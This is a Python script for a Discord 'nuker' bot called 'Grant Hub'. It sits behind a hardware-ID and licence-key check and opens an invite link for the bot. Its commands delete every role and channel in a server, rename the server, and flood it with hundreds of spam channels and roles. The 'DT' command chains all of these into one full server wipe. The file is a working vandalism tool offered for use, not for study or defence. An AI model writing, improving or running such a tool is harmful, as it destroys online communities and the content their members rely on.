#import
import os
import time
import discord
import colorama
import webbrowser
from os import system
from colorama import Fore
from pyperclip import copy
from pyautogui import alert
from discord.utils import get
from discord.ext import commands
from subprocess import check_output

#Function
def loads():
    print("")
    print(Fore.CYAN + "░██████╗░██████╗░░█████╗░███╗░░██╗████████╗  ██╗░░██╗██╗░░░██╗██████╗░")
    print(Fore.CYAN + "██╔════╝░██╔══██╗██╔══██╗████╗░██║╚══██╔══╝  ██║░░██║██║░░░██║██╔══██╗")
    print(Fore.CYAN + "██║░░██╗░██████╔╝███████║██╔██╗██║░░░██║░░░  ███████║██║░░░██║██████╦╝")
    print(Fore.CYAN + "██║░░╚██╗██╔══██╗██╔══██║██║╚████║░░░██║░░░  ██╔══██║██║░░░██║██╔══██╗")
    print(Fore.CYAN + "╚██████╔╝██║░░██║██║░░██║██║░╚███║░░░██║░░░  ██║░░██║╚██████╔╝██████╦╝")
    print(Fore.CYAN + "░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░  ╚═╝░░╚═╝░╚═════╝░╚═════╝░")
    print(Fore.CYAN + "+────────────────────────────────────────────────────────────────────+")
    print(Fore.CYAN + "+ [1] SC                                  |[4] DR                    +")
    print(Fore.CYAN + "+ [2] SR                                  |[5] CLS                   +")
    print(Fore.CYAN + "+ [3] DC                                  |[6] DT                    +")
    print(Fore.CYAN + "+────────────────────────────────────────────────────────────────────+")
def load():
    webbrowser.open('https://discord.com/api/oauth2/authorize?client_id=979367903864430654&permissions=268435504&scope=bot')
    loads()
def start():
    print("Check HWID...")
    os.system('title "Made By grantz#3529"')
    r = str(check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
    time.sleep(2)
    if r == "03C00218-044D-0599-CD06-F30700080009":
        print("Wait A Second")
        time.sleep(1)
        system('cls')
        load()
    else:
        print("Invaid HWID")
        time.sleep(1)
        system('cls')
        key = input("Register Key:")
        if key == "GH-Key-Bababa01":
            print("Wait A Second")
            time.sleep(1)
            system('cls')
            load()
        elif key == "debug":
            ch = input("Owner HWID:")
            if ch == "03C00218-044D-0599-CD06-F30700080009" and r == "03C00218-044D-0599-CD06-F30700080009":
                print("Wait A Second")
                time.sleep(1)
                system('cls')
                load()
            else:
                time.sleep(0.5)
                exit()
        else:
            print("Invaid Key")
            time.sleep(1)
            exit()

#Start
start()

#Locate Variable
texts = "GrantHubNo1"
text = texts
name = text
names = name

#Bot Setting
bot = commands.Bot(command_prefix="$", cas_insentive=True, help_command=None)

#Bot Command
@bot.command()
async def SC(ctx):
    guild = ctx.message.guild
    for i in range(500):
        try:
            await guild.create_text_channel(name)
            print("Create Channel")
        except:
            pass
@bot.command()
async def SR(ctx):
    guild = ctx.message.guild
    for i in range(250):
        try:
            await guild.create_role(name=names)
            print("Create Role")
        except:
            pass
@bot.command()
async def DR(ctx):
    guild = ctx.message.guild
    for role in ctx.guild.roles:  
        try:  
            await role.delete()
            print("Delete Role")
        except:
            pass
@bot.command()
async def DC(ctx):
    guild = ctx.message.guild
    for c in ctx.guild.channels:
        try:  
            await c.delete() 
            print("Delete Channel")
        except:
            pass
@bot.command()
async def CLS(ctx):
    system('cls')
    loads()
@bot.command()
async def DT(ctx):
    guild = ctx.message.guild
    for role in ctx.guild.roles:  
        try:  
            await role.delete()
            print("Delete Role")
        except:
            pass
    try:
        print("Change Server Name")
        await ctx.guild.edit(name=name)
    except:
        pass
    for c in ctx.guild.channels:
        try:  
            await c.delete() 
            print("Delete Channel")
        except:
            pass
    for i in range(500):
        try:
            await guild.create_text_channel(name)
            print("Create Channel")
        except:
            pass
    for i in range(250):
        try:
            await guild.create_role(name=names)
            print("Create Role")
        except:
            pass
    print("Nuke Suscess")

#Start Bot
bot.run('z')